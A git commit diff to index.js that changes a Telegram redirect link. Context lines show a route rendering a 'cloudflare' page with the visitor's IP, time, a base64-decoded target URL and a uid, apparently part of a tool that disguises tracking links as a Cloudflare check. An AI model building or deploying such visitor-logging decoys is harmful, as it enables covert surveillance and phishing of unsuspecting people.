286c1e25acae5da0768d30ee6536579158ad0110
kingofak91 <koreanil442@gmail.com>
2025-05-24 11:18:37 +0530

    Update index.js

--- index.js
+++ index.js
@@ -49,7 +49,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/th30neand0nly0ne");
+res.redirect("https://t.me/kingofak");
 }
 
          
